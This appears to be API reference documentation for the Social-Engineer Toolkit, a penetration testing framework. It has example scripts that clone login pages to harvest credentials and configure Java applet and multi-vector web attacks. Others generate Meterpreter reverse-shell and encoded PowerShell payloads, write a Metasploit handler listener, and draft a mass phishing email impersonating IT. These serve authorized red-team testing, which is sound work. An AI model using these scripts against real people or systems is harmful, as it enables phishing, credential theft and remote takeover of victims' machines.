# Social-Engineer Toolkit (SET) - Comprehensive API Documentation

## Table of Contents

1. [Overview](#overview)
2. [Installation and Setup](#installation-and-setup)
3. [Core API Reference](#core-api-reference)
4. [Web Attack Modules](#web-attack-modules)
5. [Payload Generation APIs](#payload-generation-apis)
6. [Phishing and Email Modules](#phishing-and-email-modules)
7. [Fast-Track Modules](#fast-track-modules)
8. [Utility Functions](#utility-functions)
9. [Configuration Management](#configuration-management)
10. [Examples and Usage](#examples-and-usage)

---

## Overview

The Social-Engineer Toolkit (SET) is an open-source penetration testing framework designed for social engineering attacks. This documentation provides comprehensive coverage of all public APIs, functions, and components available to developers and security testers.

**Version**: See `src/core/set.version`  
**Author**: David Kennedy (ReL1K)  
**Company**: TrustedSec  
**License**: See `readme/LICENSE`

### Key Features

- Spear-phishing attack vectors
- Website attack vectors (Java applet, browser exploits, credential harvester)
- Infectious media generator
- Payload creation and listener management
- Mass email attacks
- Teensy USB HID attack vectors
- Wireless access point attacks
- QR code generator
- PowerShell attack vectors

---

## Installation and Setup

### Requirements

```bash
# Install via pip
pip3 install -r requirements.txt

# Run setup
python3 setup.py
```

### Quick Start

```bash
# Launch SET
./setoolkit

# Or from installed location
setoolkit
```

### Configuration

Configuration file location: `/etc/setoolkit/set.config`

---

## Core API Reference

### Module: `src.core.setcore`

The core module provides essential functionality used throughout SET.

#### System Functions

##### `check_os()`

Checks the operating system.

**Returns**: `str` - "posix" for Unix-like systems, "windows" for Windows

**Example**:
```python
from src.core.setcore import check_os

os_type = check_os()
if os_type == "posix":
    print("Running on Unix-like system")
```

##### `definepath()`

Returns the main SET path.

**Returns**: `str` - Current working directory or `/usr/local/share/setoolkit/`

**Example**:
```python
from src.core.setcore import definepath

set_path = definepath()
print(f"SET is running from: {set_path}")
```

##### `get_version()`

Gets the current SET version.

**Returns**: `str` - Version number from `src/core/set.version`

**Example**:
```python
from src.core.setcore import get_version

version = get_version()
print(f"SET Version: {version}")
```

#### Output and Display Functions

##### `print_status(message)`

Prints a status message in green.

**Parameters**:
- `message` (str): The status message to display

**Example**:
```python
from src.core.setcore import print_status

print_status("Website cloning completed successfully")
```

##### `print_info(message)`

Prints an informational message in blue.

**Parameters**:
- `message` (str): The information message to display

**Example**:
```python
from src.core.setcore import print_info

print_info("Starting payload generation process")
```

##### `print_warning(message)`

Prints a warning message in yellow.

**Parameters**:
- `message` (str): The warning message to display

**Example**:
```python
from src.core.setcore import print_warning

print_warning("This attack vector requires root privileges")
```

##### `print_error(message)`

Prints an error message in red.

**Parameters**:
- `message` (str): The error message to display

**Example**:
```python
from src.core.setcore import print_error

print_error("Failed to connect to target host")
```

#### User Input Functions

##### `setprompt(category, text)`

Creates formatted prompts for user input.

**Parameters**:
- `category` (list or str): Category levels for the prompt (e.g., ["2"], "0")
- `text` (str): Prompt text to display

**Returns**: `str` - Formatted prompt string

**Example**:
```python
from src.core.setcore import setprompt

user_input = input(setprompt(["1"], "Enter target IP address"))
```

##### `yesno_prompt(category, text)`

Creates a yes/no prompt that validates input.

**Parameters**:
- `category` (list or str): Category levels for the prompt
- `text` (str): Prompt text to display

**Returns**: `str` - "YES" or "NO"

**Example**:
```python
from src.core.setcore import yesno_prompt

response = yesno_prompt(["1"], "Do you want to start the listener [yes|no]")
if response == "YES":
    # Start listener
    pass
```

##### `return_continue()`

Displays a "press return to continue" message and waits for user input.

**Example**:
```python
from src.core.setcore import return_continue

print("Operation completed!")
return_continue()
```

#### Menu Functions

##### `create_menu(text, menu)`

Creates and displays a formatted menu.

**Parameters**:
- `text` (str): Header text for the menu
- `menu` (list): List of menu options

**Returns**: `create_menu` object that prints the menu

**Example**:
```python
from src.core.setcore import create_menu

menu_text = "Select Attack Vector:"
menu_options = [
    "Java Applet Attack",
    "Browser Exploit",
    "Credential Harvester",
    "Return to Main Menu"
]

create_menu(menu_text, menu_options)
```

##### `show_banner(version, graphic)`

Displays the SET banner.

**Parameters**:
- `version` (str): Version string to display
- `graphic` (str): "1" to show random graphic, other values for no graphic

**Example**:
```python
from src.core.setcore import show_banner, get_version

version = get_version()
show_banner(version, '1')
```

#### Network Functions

##### `detect_public_ip()`

Auto-detects the public IPv4 address.

**Returns**: `str` - IP address

**Example**:
```python
from src.core.setcore import detect_public_ip

ip = detect_public_ip()
print(f"Detected IP: {ip}")
```

##### `validate_ip(address)`

Validates if a string is a valid IPv4 address.

**Parameters**:
- `address` (str): IP address to validate

**Returns**: `bool` - True if valid, False otherwise

**Example**:
```python
from src.core.setcore import validate_ip

if validate_ip("192.168.1.1"):
    print("Valid IP address")
else:
    print("Invalid IP address")
```

##### `is_valid_ipv4(ip)`

Validates IPv4 address format.

**Parameters**:
- `ip` (str): IP address to validate

**Returns**: `bool` - True if valid IPv4

**Example**:
```python
from src.core.setcore import is_valid_ipv4

if is_valid_ipv4("10.0.0.1"):
    print("Valid IPv4 address")
```

##### `is_valid_ipv6(ip)`

Validates IPv6 address format.

**Parameters**:
- `ip` (str): IP address to validate

**Returns**: `bool` - True if valid IPv6

**Example**:
```python
from src.core.setcore import is_valid_ipv6

if is_valid_ipv6("2001:0db8:85a3:0000:0000:8a2e:0370:7334"):
    print("Valid IPv6 address")
```

##### `grab_ipaddress()`

Prompts user for IP address with validation.

**Returns**: `str` - Valid IP address or hostname

**Example**:
```python
from src.core.setcore import grab_ipaddress

listener_ip = grab_ipaddress()
print(f"Using listener IP: {listener_ip}")
```

#### String and Encoding Functions

##### `generate_random_string(low, high)`

Generates a random alphanumeric string.

**Parameters**:
- `low` (int): Minimum length
- `high` (int): Maximum length

**Returns**: `str` - Random string

**Example**:
```python
from src.core.setcore import generate_random_string

filename = generate_random_string(8, 12) + ".exe"
print(f"Generated filename: {filename}")
```

##### `encryptAES(secret, data)`

Encrypts data using AES encryption.

**Parameters**:
- `secret` (bytes): 32-byte secret key
- `data` (str): Data to encrypt

**Returns**: `str` - Base64 encoded encrypted data

**Example**:
```python
import os
from src.core.setcore import encryptAES

secret = os.urandom(32)
encrypted = encryptAES(secret, "sensitive data")
print(f"Encrypted: {encrypted}")
```

#### File and System Functions

##### `log(error)`

Logs errors to the SET log file.

**Parameters**:
- `error` (Exception or str): Error to log

**Example**:
```python
from src.core.setcore import log

try:
    # some operation
    pass
except Exception as e:
    log(e)
```

##### `cleanup_routine()`

Cleans up temporary files and processes.

**Example**:
```python
from src.core.setcore import cleanup_routine

# At end of script
cleanup_routine()
```

##### `exit_set()`

Cleanly exits SET with cleanup.

**Example**:
```python
from src.core.setcore import exit_set

if user_wants_to_quit:
    exit_set()
```

#### Metasploit Integration

##### `meta_path()`

Gets the Metasploit installation path.

**Returns**: `str` - Path to Metasploit or False if not found

**Example**:
```python
from src.core.setcore import meta_path

msf_path = meta_path()
if msf_path:
    print(f"Metasploit found at: {msf_path}")
else:
    print("Metasploit not found")
```

##### `meta_database()`

Gets the Metasploit database configuration.

**Returns**: `str` - Database type (e.g., "postgresql")

**Example**:
```python
from src.core.setcore import meta_database

db = meta_database()
print(f"Using database: {db}")
```

#### Payload and Shellcode Functions

##### `metasploit_shellcode(payload, ipaddr, port)`

Generates Metasploit shellcode.

**Parameters**:
- `payload` (str): Payload type (e.g., "windows/meterpreter/reverse_tcp")
- `ipaddr` (str): Listener IP address
- `port` (str): Listener port

**Returns**: `str` - Raw shellcode

**Example**:
```python
from src.core.setcore import metasploit_shellcode

shellcode = metasploit_shellcode(
    "windows/meterpreter/reverse_tcp",
    "192.168.1.100",
    "443"
)
```

##### `generate_shellcode(payload, ipaddr, port)`

Generates shellcode using msfvenom.

**Parameters**:
- `payload` (str): Payload identifier
- `ipaddr` (str): IP address
- `port` (str): Port number

**Returns**: `str` - Generated shellcode

**Example**:
```python
from src.core.setcore import generate_shellcode

shellcode = generate_shellcode(
    "windows/meterpreter/reverse_https",
    "10.0.0.5",
    "443"
)
```

##### `shellcode_replace(ipaddr, port, shellcode)`

Replaces IP and port in shellcode template.

**Parameters**:
- `ipaddr` (str): Target IP address
- `port` (str): Target port
- `shellcode` (str): Shellcode template

**Returns**: `str` - Modified shellcode

**Example**:
```python
from src.core.setcore import shellcode_replace

template_shellcode = "\\xff\\xfe\\xfd\\xfc..."
modified = shellcode_replace("192.168.1.50", "4444", template_shellcode)
```

##### `generate_powershell_alphanumeric_payload(payload, ipaddr, port, payload2)`

Generates alphanumeric PowerShell payload.

**Parameters**:
- `payload` (str): Payload type
- `ipaddr` (str): IP address
- `port` (str): Port
- `payload2` (str): Secondary payload info

**Returns**: `str` - Base64 encoded PowerShell payload

**Example**:
```python
from src.core.setcore import generate_powershell_alphanumeric_payload

ps_payload = generate_powershell_alphanumeric_payload(
    "windows/meterpreter/reverse_tcp",
    "10.0.0.1",
    "443",
    ""
)
print(f"PowerShell payload: {ps_payload}")
```

---

## Web Attack Modules

### Module: `src.webattack.web_clone.cloner`

Website cloning functionality for SET attacks.

#### Key Features

- Clone websites using wget or urllib
- Inject Java applets
- Inject browser exploits
- Support for credential harvesting
- UNC path embedding

#### Usage Example

```python
from src.core.setcore import *

# Configuration is typically done through user prompts
# The cloner module reads from configuration files in userconfigpath

# Example configuration
update_options("IPADDR=192.168.1.100")

# Create site template
with open(userconfigpath + "site.template", "w") as f:
    f.write("TEMPLATE=CUSTOM\n")
    f.write("URL=https://example.com\n")

# Set attack vector
with open(userconfigpath + "attack_vector", "w") as f:
    f.write("java")

# Import and run cloner
import src.webattack.web_clone.cloner
```

#### Configuration Options

The cloner module uses several configuration options from `/etc/setoolkit/set_config`:

- `USER_AGENT_STRING`: User agent for requests
- `WEB_PORT`: Web server port (default: 80)
- `JAVA_ID_PARAM`: Java applet ID parameter
- `JAVA_REPEATER`: Enable Java repeater (Boolean)
- `AUTO_REDIRECT`: Auto-redirect after payload delivery
- `UNC_EMBED`: Embed UNC paths for hash harvesting

### Module: `src.webattack.harvester.harvester`

Credential harvesting attack vector.

#### Key Features

- Clones websites and monitors POST requests
- Captures credentials in real-time
- Generates reports of captured data
- Supports custom and templated websites

#### Usage Example

```python
from src.core.setcore import *

# Set IP for harvester
ipaddr = "192.168.1.100"
update_options("IPADDR=" + ipaddr)

# Configure site to clone
with open(userconfigpath + "site.template", "w") as f:
    f.write("TEMPLATE=CUSTOM\n")
    f.write("URL=https://login.example.com\n")

# Set attack vector
with open(userconfigpath + "attack_vector", "w") as f:
    f.write("harvester")

# Import harvester module
import src.webattack.harvester.harvester
```

### Module: `src.webattack.multi_attack.multiattack`

Multi-attack vector support.

#### Usage Example

```python
# Multi-attack combines multiple attack vectors
# Configuration handled through SET menu system

# Set multiattack flag
with open(userconfigpath + "attack_vector", "w") as f:
    f.write("multiattack")

# Import multiattack
import src.webattack.multi_attack.multiattack
```

### Module: `src.webattack.hta.main`

HTML Application (HTA) attack vector.

#### Key Functions

##### `gen_hta_cool_stuff()`

Generates HTA payload and configuration.

**Example**:
```python
from src.webattack.hta.main import gen_hta_cool_stuff
from src.core.setcore import update_options

update_options("ATTACK_VECTOR=HTA")
gen_hta_cool_stuff()
```

---

## Payload Generation APIs

### Module: `src.core.payloadgen.create_payloads`

Comprehensive payload generation functionality.

#### Payload Types

1. **Windows Payloads**
   - `windows/meterpreter/reverse_tcp`
   - `windows/meterpreter/reverse_https`
   - `windows/meterpreter/reverse_http`
   - `windows/meterpreter/reverse_tcp_allports`
   - `windows/shell/reverse_tcp`
   - `windows/x64/meterpreter/reverse_tcp`

2. **Shellcode Injection Payloads**
   - `shellcode/alphanum` - Alphanumeric shellcode
   - `shellcode/pyinject` - Python injector
   - `shellcode/multipyinject` - Multi-payload Python injector

3. **SET Special Payloads**
   - `set/reverse_shell` - SET interactive shell
   - `SETSHELL_HTTP` - HTTP reverse shell
   - `RATTE` - Remote Administration Tool

4. **Custom Payloads**
   - Import your own executables
   - `cmd/multi` - Multiple command execution

#### Usage Example

```python
from src.core.setcore import *
import sys

# Configure IP address
update_options("IPADDR=192.168.1.100")

# Set payload type
with open(userconfigpath + "metasploit.payload", "w") as f:
    f.write("windows/meterpreter/reverse_tcp")

# Set port
update_options("PORT=443")

# Import payload generator
sys.path.append(definepath() + "/src/core/payloadgen")
import create_payloads
```

#### Payload Generation Functions

The module automatically:
- Generates payloads based on configuration
- Creates Metasploit resource files
- Sets up listeners
- Handles multi-platform payloads (Windows, OSX, Linux)

### Module: `src.core.payloadgen.solo`

Standalone payload generation without web attack integration.

#### Usage Example

```python
from src.core.setcore import update_options

# Set solo mode
update_options("PAYLOADGEN=SOLO")

# Import solo payload generator
import src.core.payloadgen.solo
```

---

## Phishing and Email Modules

### Module: `src.phishing.smtp.client.smtp_client`

SMTP client for mass email attacks.

#### Key Features

- Support for Gmail, Yahoo, Hotmail
- Custom SMTP server support
- Sendmail integration
- HTML and plain text emails
- File attachments
- High priority flagging
- Mass mailing from lists

#### Email Configuration

```python
# Configuration options in set.config:
# EMAIL_PROVIDER= (gmail|yahoo|hotmail)
# SMTP server is auto-configured based on provider
```

#### Usage Example

```python
from src.core.setcore import *

# Single email example
to_address = "target@example.com"
from_address = "attacker@gmail.com"
subject = "Important Security Update"
body = "Please review the attached document..."
attachment = userconfigpath + "template.pdf"

# Email is sent through the mail() function in smtp_client module
```

#### Email Function

```python
def mail(to, subject, text, attach, prioflag1, prioflag2):
    """
    Send email with attachment
    
    Parameters:
    - to (str): Recipient email
    - subject (str): Email subject
    - text (str): Email body
    - attach (str): Path to attachment file
    - prioflag1 (str): X-Priority header (' 1 (Highest)' or '')
    - prioflag2 (str): X-MSMail-Priority header (' High' or '')
    """
```

#### Mass Mailer Example

```python
# Create email list file (emails.txt)
# One email per line:
# user1@example.com
# user2@example.com
# user3@example.com

# The mass mailer reads from this file
filepath = "/path/to/emails.txt"

# Import and run
import src.phishing.smtp.client.smtp_web
```

---

## Fast-Track Modules

### Module: `src.fasttrack.autopwn`

Metasploit autopwn integration for automated exploitation.

#### Key Functions

##### `prep(database, ranges)`

Prepares the autopwn answer file.

**Parameters**:
- `database` (str): SQL driver type (e.g., "postgresql")
- `ranges` (str): IP ranges in nmap syntax

**Example**:
```python
from src.fasttrack.autopwn import prep

prep("postgresql", "192.168.1.0/24")
```

##### `launch()`

Launches Metasploit with the autopwn configuration.

**Example**:
```python
from src.fasttrack.autopwn import launch

launch()
```

##### `do_autopwn()`

Interactive autopwn attack.

**Example**:
```python
from src.fasttrack.autopwn import do_autopwn

do_autopwn()  # Prompts user for IP ranges and confirmation
```

### Module: `src.fasttrack.psexec`

PSExec attack functionality for Windows targets.

### Module: `src.fasttrack.mssql`

MSSQL attack vectors.

### Module: `src.fasttrack.delldrac`

Dell DRAC exploitation.

---

## Utility Functions

### Network Utilities

#### CIDR Block Functions

##### `ip2bin(ip)`

Converts IP address to binary representation.

**Parameters**:
- `ip` (str): IP address in dotted-quad format

**Returns**: `str` - 32-bit binary string

**Example**:
```python
from src.core.setcore import ip2bin

binary = ip2bin("192.168.1.1")
print(binary)  # Output: 11000000101010000000000100000001
```

##### `bin2ip(b)`

Converts binary string to IP address.

**Parameters**:
- `b` (str): Binary string

**Returns**: `str` - IP address

**Example**:
```python
from src.core.setcore import bin2ip

ip = bin2ip("11000000101010000000000100000001")
print(ip)  # Output: 192.168.1.1
```

##### `printCIDR(c)`

Generates list of IP addresses from CIDR block.

**Parameters**:
- `c` (str): CIDR notation (e.g., "192.168.1.0/24")

**Returns**: `str` - Comma-separated IP addresses

**Example**:
```python
from src.core.setcore import printCIDR

ips = printCIDR("192.168.1.0/28")
print(ips)  # Returns IPs in range
```

##### `validateCIDRBlock(b)`

Validates CIDR block format.

**Parameters**:
- `b` (str): CIDR notation to validate

**Returns**: `bool` - True if valid

**Example**:
```python
from src.core.setcore import validateCIDRBlock

if validateCIDRBlock("10.0.0.0/8"):
    print("Valid CIDR block")
```

#### SQL Server Discovery

##### `get_sql_port(host)`

Queries UDP:1434 for MSSQL running port.

**Parameters**:
- `host` (str): Target hostname or IP

**Returns**: `str` - "host:port" or None

**Example**:
```python
from src.core.setcore import get_sql_port

sql_server = get_sql_port("192.168.1.50")
if sql_server:
    print(f"SQL Server found at: {sql_server}")
```

#### Process Management

##### `kill_proc(port, flag)`

Kills processes listening on specific port.

**Parameters**:
- `port` (str): Port number
- `flag` (str): Process name identifier

**Example**:
```python
from src.core.setcore import kill_proc

# Kill python processes on port 80
kill_proc("80", "python")
```

### File Utilities

##### `copyfolder(sourcePath, destPath)`

Recursively copies folder contents.

**Parameters**:
- `sourcePath` (str): Source directory path
- `destPath` (str): Destination directory path

**Example**:
```python
from src.core.setcore import copyfolder

copyfolder("/source/dir", "/destination/dir")
```

##### `tail(filename)`

Tails a file (follows new content).

**Parameters**:
- `filename` (str): Path to file

**Example**:
```python
from src.core.setcore import tail

# Monitor log file
tail("/var/log/set.log")
```

### Web Server Functions

##### `start_web_server(directory)`

Starts threaded web server.

**Parameters**:
- `directory` (str): Directory to serve

**Example**:
```python
from src.core.setcore import start_web_server

start_web_server(userconfigpath + "web_clone")
```

##### `start_web_server_unthreaded(directory)`

Starts unthreaded web server (blocking).

**Parameters**:
- `directory` (str): Directory to serve

**Example**:
```python
from src.core.setcore import start_web_server_unthreaded

start_web_server_unthreaded(userconfigpath + "web_clone")
```

---

## Configuration Management

### Configuration Functions

##### `check_config(param)`

Reads configuration parameter from `/etc/setoolkit/set.config`.

**Parameters**:
- `param` (str): Configuration parameter name with '='

**Returns**: `str` - Configuration value

**Example**:
```python
from src.core.setcore import check_config

metasploit_path = check_config("METASPLOIT_PATH=")
auto_detect = check_config("AUTO_DETECT=")
email_provider = check_config("EMAIL_PROVIDER=")

print(f"Metasploit: {metasploit_path}")
print(f"Auto-detect: {auto_detect}")
print(f"Email: {email_provider}")
```

##### `update_options(option)`

Updates SET session options.

**Parameters**:
- `option` (str): Option string (e.g., "IPADDR=192.168.1.1")

**Example**:
```python
from src.core.setcore import update_options

update_options("IPADDR=10.0.0.5")
update_options("PORT=443")
update_options("ATTACK_VECTOR=java")
```

##### `check_options(option)`

Checks SET session options.

**Parameters**:
- `option` (str): Option name with '='

**Returns**: `str` - Option value or 0 if not found

**Example**:
```python
from src.core.setcore import check_options

ipaddr = check_options("IPADDR=")
if ipaddr != 0:
    print(f"Using IP: {ipaddr}")
```

### Important Configuration Parameters

#### `/etc/setoolkit/set.config`

```ini
# Core Settings
CONFIG_VERSION=7.7.9
METASPLOIT_PATH=/usr/bin/
METASPLOIT_MODE=ON
AUTO_DETECT=ON

# Web Settings
WEB_PORT=80
APACHE_DIRECTORY=/var/www
USER_AGENT_STRING=Mozilla/5.0 ...

# Email Settings
EMAIL_PROVIDER=gmail
SMTP_FROM_NAME=
SMTP_FROM_ADDRESS=

# Attack Settings
JAVA_REPEATER=ON
AUTO_MIGRATE=ON
POWERSHELL_INJECTION=ON
DEPLOY_BINARIES=YES
UNC_EMBED=OFF

# Payload Settings
METERPRETER_MULTI_SCRIPT=OFF
AUTO_DETECT=ON
```

---

## Examples and Usage

### Example 1: Simple Java Applet Attack

```python
#!/usr/bin/env python
from src.core.setcore import *
import sys

# Configuration
target_site = "https://example.com"
attacker_ip = "192.168.1.100"
listener_port = "443"

# Setup
print_status("Configuring Java Applet Attack")

# Set IP address
update_options(f"IPADDR={attacker_ip}")
update_options(f"PORT={listener_port}")

# Configure site template
with open(userconfigpath + "site.template", "w") as f:
    f.write("TEMPLATE=CUSTOM\n")
    f.write(f"URL={target_site}\n")

# Set attack vector
with open(userconfigpath + "attack_vector", "w") as f:
    f.write("java")

# Clone website
print_status(f"Cloning {target_site}")
import src.webattack.web_clone.cloner

# Generate payload
print_status("Generating payload")
sys.path.append(definepath() + "/src/core/payloadgen")
import create_payloads

# Launch web server
print_status("Starting web server")
from src.html import spawn

print_status("Attack configured and ready")
print_info(f"Send victims to: http://{attacker_ip}")
```

### Example 2: Credential Harvester

```python
#!/usr/bin/env python
from src.core.setcore import *

# Configuration
target_site = "https://login.example.com"
attacker_ip = "10.0.0.5"

print_status("Setting up Credential Harvester")

# Configure IP
update_options(f"IPADDR={attacker_ip}")

# Set site to clone
with open(userconfigpath + "site.template", "w") as f:
    f.write("TEMPLATE=CUSTOM\n")
    f.write(f"URL={target_site}\n")

# Set harvester attack
with open(userconfigpath + "attack_vector", "w") as f:
    f.write("harvester")

# Clone and setup harvester
print_status(f"Cloning {target_site}")
import src.webattack.web_clone.cloner

print_status("Starting credential harvester")
import src.webattack.harvester.harvester

print_status("Harvester running")
print_info(f"Credentials will be logged to {userconfigpath}")
```

### Example 3: Mass Email Campaign

```python
#!/usr/bin/env python
import os
from src.core.setcore import *

# Prepare email list
emails_list = """victim1@example.com
victim2@example.com
victim3@example.com"""

email_file = "/tmp/email_list.txt"
with open(email_file, "w") as f:
    f.write(emails_list)

# Create payload
print_status("Creating malicious PDF")
# Generate payload through SET menus or use existing

# Configure email template
subject = "Urgent: Security Update Required"
body = """Dear Employee,

Please review the attached security document immediately.

Best regards,
IT Security Team"""

print_status("Preparing mass email campaign")
print_warning("This is for authorized testing only!")

# Import email module
import src.phishing.smtp.client.smtp_web
```

### Example 4: PowerShell Attack Vector

```python
#!/usr/bin/env python
from src.core.setcore import *

# Configuration
attacker_ip = "192.168.1.100"
listener_port = "443"

print_status("Generating PowerShell payload")

# Configure options
update_options(f"IPADDR={attacker_ip}")
update_options(f"PORT={listener_port}")
update_options("POWERSHELL_INJECTION=ON")

# Generate PowerShell payload
payload = "windows/meterpreter/reverse_https"
ps_payload = generate_powershell_alphanumeric_payload(
    payload,
    attacker_ip,
    listener_port,
    ""
)

print_status("PowerShell payload generated")
print_info(f"Execute on target: powershell -ec {ps_payload}")

# Setup listener
with open(userconfigpath + "meta_config", "w") as f:
    f.write("use exploit/multi/handler\n")
    f.write(f"set PAYLOAD {payload}\n")
    f.write(f"set LHOST {attacker_ip}\n")
    f.write(f"set LPORT {listener_port}\n")
    f.write("set ExitOnSession false\n")
    f.write("exploit -j\n")

print_status("Metasploit listener configuration ready")
```

### Example 5: Custom Payload Deployment

```python
#!/usr/bin/env python
from src.core.setcore import *

# Custom executable path
custom_exe = "/path/to/custom_backdoor.exe"

print_status("Deploying custom payload")

# Validate file exists
if not os.path.isfile(custom_exe):
    print_error(f"File not found: {custom_exe}")
    exit_set()

# Copy to SET directory
import shutil
shutil.copyfile(custom_exe, userconfigpath + "msf.exe")

# Mark as custom
with open(userconfigpath + "custom.exe", "w") as f:
    f.write("VALID")

update_options(f"CUSTOM_EXE={custom_exe}")

print_status("Custom payload ready for deployment")

# Configure web attack to deliver custom payload
with open(userconfigpath + "attack_vector", "w") as f:
    f.write("java")

# Continue with web attack setup...
```

### Example 6: Multi-Attack Vector

```python
#!/usr/bin/env python
from src.core.setcore import *

# Configuration
target_site = "https://example.com"
attacker_ip = "192.168.1.100"

print_status("Configuring multi-attack vector")

# Set multiattack
update_options(f"IPADDR={attacker_ip}")

with open(userconfigpath + "attack_vector", "w") as f:
    f.write("multiattack")

# Configure site
with open(userconfigpath + "site.template", "w") as f:
    f.write("TEMPLATE=CUSTOM\n")
    f.write(f"URL={target_site}\n")

# Enable Java attack in multiattack
with open(userconfigpath + "multi_java", "w") as f:
    f.write("on")

# Enable browser exploits in multiattack
with open(userconfigpath + "multi_meta", "w") as f:
    f.write("on")

print_status("Multi-attack configured with:")
print_info("- Java Applet Attack")
print_info("- Browser Exploits")
print_info("- Multiple payload delivery")

# Import multiattack module
import src.webattack.multi_attack.multiattack
```

### Example 7: QR Code Generator

```python
#!/usr/bin/env python
from src.core.setcore import *

try:
    from src.qrcode.qrgenerator import gen_qrcode
    
    # URL to encode
    target_url = "http://192.168.1.100:80/malicious_page"
    
    print_status("Generating QR code")
    gen_qrcode(target_url)
    
    print_status(f"QR code saved to: {userconfigpath}/reports/")
    print_info("QR code can be printed and used in physical attacks")
    
except ImportError:
    print_error("PIL/Pillow and qrcode modules required")
    print_info("Install with: pip install Pillow qrcode")
```

### Example 8: Website Cloning Only

```python
#!/usr/bin/env python
from src.core.setcore import *

# Clone a website without injecting attacks
target_url = "https://www.example.com"
export_path = "/tmp/cloned_site"

print_status(f"Cloning {target_url}")

# Use site_cloner function
site_cloner(target_url, export_path, "")

print_status(f"Website cloned to: {export_path}")
print_info("You can now modify the site manually")
```

### Example 9: Teensy USB HID Attack

```python
#!/usr/bin/env python
from src.core.setcore import *

# Generate Teensy payload
attack_method = "powershell_reverse"  # or "beef", "powershell_down", etc.

print_status("Generating Teensy HID payload")

# Generate the PDE file
teensy_pde_generator(attack_method)

print_status(f"Teensy payload generated: {userconfigpath}/reports/")
print_info("Upload the .ino file to your Teensy device")
print_warning("Physical access to target required")
```

### Example 10: Automated Testing Script

```python
#!/usr/bin/env python
"""
Automated SET testing script
For use in controlled testing environments only
"""
from src.core.setcore import *
import time

class SETTest:
    def __init__(self):
        self.test_ip = "192.168.1.100"
        self.test_port = "443"
        self.results = []
    
    def test_ip_validation(self):
        """Test IP validation functions"""
        print_status("Testing IP validation")
        
        test_cases = [
            ("192.168.1.1", True),
            ("256.1.1.1", False),
            ("10.0.0.1", True),
            ("not_an_ip", False)
        ]
        
        for ip, expected in test_cases:
            result = validate_ip(ip)
            status = "PASS" if result == expected else "FAIL"
            print_info(f"  {ip}: {status}")
            self.results.append(status == "PASS")
    
    def test_string_generation(self):
        """Test random string generation"""
        print_status("Testing string generation")
        
        rand_str = generate_random_string(8, 12)
        if 8 <= len(rand_str) <= 12:
            print_info(f"  Generated: {rand_str} - PASS")
            self.results.append(True)
        else:
            print_error(f"  Generated: {rand_str} - FAIL")
            self.results.append(False)
    
    def test_cidr_validation(self):
        """Test CIDR block validation"""
        print_status("Testing CIDR validation")
        
        test_cases = [
            ("192.168.1.0/24", True),
            ("10.0.0.0/8", True),
            ("256.1.1.0/24", False),
            ("10.0.0.0/33", False)
        ]
        
        for cidr, expected in test_cases:
            result = validateCIDRBlock(cidr)
            status = "PASS" if result == expected else "FAIL"
            print_info(f"  {cidr}: {status}")
            self.results.append(status == "PASS")
    
    def run_all_tests(self):
        """Run all tests"""
        print_status("Starting SET API tests")
        
        self.test_ip_validation()
        self.test_string_generation()
        self.test_cidr_validation()
        
        # Summary
        passed = sum(self.results)
        total = len(self.results)
        print_status(f"\nTest Results: {passed}/{total} passed")
        
        if passed == total:
            print_status("All tests PASSED")
        else:
            print_warning(f"{total - passed} tests FAILED")

# Run tests
if __name__ == "__main__":
    tester = SETTest()
    tester.run_all_tests()
```

---

## Best Practices

### Security Considerations

1. **Authorization**: Always obtain proper authorization before using SET
2. **Legal Compliance**: Ensure compliance with local laws and regulations
3. **Scope**: Stay within agreed-upon scope of engagement
4. **Documentation**: Document all activities and results
5. **Cleanup**: Always clean up after engagements

### Performance Optimization

1. **Payload Size**: Keep payloads small for faster delivery
2. **Encoding**: Use appropriate encoding for target environment
3. **Multi-threading**: Leverage SET's multi-threaded capabilities
4. **Resource Cleanup**: Always call `cleanup_routine()` when done

### Error Handling

```python
from src.core.setcore import *

try:
    # Your SET operations
    result = some_set_function()
    
except KeyboardInterrupt:
    print_warning("Operation cancelled by user")
    cleanup_routine()
    exit_set()
    
except Exception as e:
    print_error(f"An error occurred: {str(e)}")
    log(e)  # Log the error
    cleanup_routine()
```

### Logging

```python
from src.core.setcore import log, print_status

try:
    # Operations
    pass
except Exception as e:
    log(e)  # Logs to src/logs/set_logfile.log
    print_error(f"Error: {str(e)}")
```

---

## Troubleshooting

### Common Issues

#### 1. Metasploit Not Found

```python
from src.core.setcore import meta_path

msf_path = meta_path()
if not msf_path:
    print("Metasploit not found. Install Metasploit or configure path in set.config")
```

**Solution**: Install Metasploit or update `METASPLOIT_PATH=` in `/etc/setoolkit/set.config`

#### 2. Website Cloning Fails

```python
# Check if cloner.failed file exists
import os
from src.core.setcore import userconfigpath

if os.path.isfile(userconfigpath + "cloner.failed"):
    print("Website cloning failed")
    # Check internet connection
    # Verify target URL is accessible
    # Check for anti-scraping measures
```

#### 3. Permissions Issues

```python
from src.core.setcore import check_os

if check_os() == "posix":
    import os
    if os.geteuid() != 0:
        print("SET requires root privileges on Linux")
        exit(1)
```

#### 4. Port Conflicts

```python
from src.core.setcore import kill_proc

# Kill processes on port 80
kill_proc("80", "python")
kill_proc("80", "apache2")
```

---

## API Reference Summary

### Core Functions Quick Reference

| Function | Purpose | Returns |
|----------|---------|---------|
| `check_os()` | Detect OS | str |
| `get_version()` | Get SET version | str |
| `detect_public_ip()` | Auto-detect IP | str |
| `validate_ip(ip)` | Validate IPv4 | bool |
| `grab_ipaddress()` | Prompt for IP | str |
| `generate_random_string(low, high)` | Random string | str |
| `print_status(msg)` | Print status | None |
| `print_error(msg)` | Print error | None |
| `print_warning(msg)` | Print warning | None |
| `setprompt(cat, text)` | Create prompt | str |
| `yesno_prompt(cat, text)` | Yes/No prompt | str |
| `meta_path()` | Get MSF path | str |
| `cleanup_routine()` | Cleanup | None |
| `exit_set()` | Exit SET | None |

### Configuration Quick Reference

| Parameter | Description | Example |
|-----------|-------------|---------|
| `IPADDR=` | Attacker IP | `192.168.1.100` |
| `PORT=` | Listener port | `443` |
| `ATTACK_VECTOR=` | Attack type | `java` |
| `CUSTOM_EXE=` | Custom payload path | `/path/to/exe` |
| `POWERSHELL_INJECTION=` | PS injection | `ON`/`OFF` |
| `METASPLOIT_PATH=` | MSF location | `/usr/bin/` |
| `EMAIL_PROVIDER=` | SMTP provider | `gmail` |

---

## Additional Resources

### Documentation

- **User Manual**: `readme/User_Manual.pdf`
- **Credits**: `readme/CREDITS`
- **License**: `readme/LICENSE`
- **Changelog**: `readme/CHANGELOG`

### Online Resources

- **GitHub**: https://github.com/trustedsec/social-engineer-toolkit
- **Website**: https://www.trustedsec.com
- **Twitter**: @TrustedSec, @HackingDave

### Support

